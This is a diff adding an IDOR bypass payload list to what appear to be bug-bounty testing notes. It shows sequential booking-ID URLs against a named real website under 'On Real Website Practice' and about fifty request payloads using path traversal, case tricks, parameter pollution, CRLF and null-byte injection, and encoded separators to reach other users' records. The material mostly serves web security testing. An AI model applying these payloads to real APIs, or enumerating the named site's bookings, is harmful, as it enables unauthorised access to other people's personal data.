@@ -29,6 +29,9 @@ Send request via Repeater
 
 
 
+
+
+
                                                                                     On Real Website Practice
 
 
@@ -37,6 +40,56 @@ https://www.tring.co.in/order/track-booking?booking-id=Special_Pay_596522
 https://www.tring.co.in/order/track-booking?booking-id=Special_Pay_596523
 https://www.tring.co.in/order/track-booking?booking-id=Special_Pay_596524 etc...
 
+
+                                                                 
+                                                                                      Bypass Methods
+/api/v5/users/9/
+/api/v5/users//9
+/api/v5/users/./9
+/API/v5/USERS/9
+/api/user?user_id=9
+/api/v1/messages?user_id=victim_uuid
+/api/users?id=10,9
+{"Account":"2222;1111"}
+2222:1111
+2222|1111
+2222&1111
+?user_id=10&user_id=9
+{"userid":[123]}
+{"userid":{"userid":123}}
+{"userid":1234,"userid":2542}
+/api/users/9%00
+%0d%0a
+%0a
+%0d
+%00
+{"id":2222%0d%0a1111}
+{"id":2222%0a1111}
+{"id":2222%0d1111}
+{"id":2222%001111}
+{"id":2222;1111}
+{"id":2222,1111}
+{"id":2222|1111}
+{"id":2222&1111}
+{"id":2222#1111}
+{"id":2222%0a%0dcc:1111}
+/api/v1/user/../admin
+/api/v1/%2e%2e/admin
+/api/v1/users/%2f9
+/api/v1/users/%252f9
+/api/v1/users?id[]=9
+/api/v1/users?id=9&id=10
+/api/v1/users?id=9%20
+/api/v1/users?id=%209
+/api/v1/users?id=09
+/api/v1/users?id=9.
+/api/v1/users?id=9..
+/api/v1/users?id=9.json
+/api/v1/users?id=9/
+/api/v1/users?id=9%2f
+/api/v1/users?id=9%5c
+/api/v1/users?id=9%09
+/api/v1/users?id=9%0b
 
                                                                                              CVSS Score
 
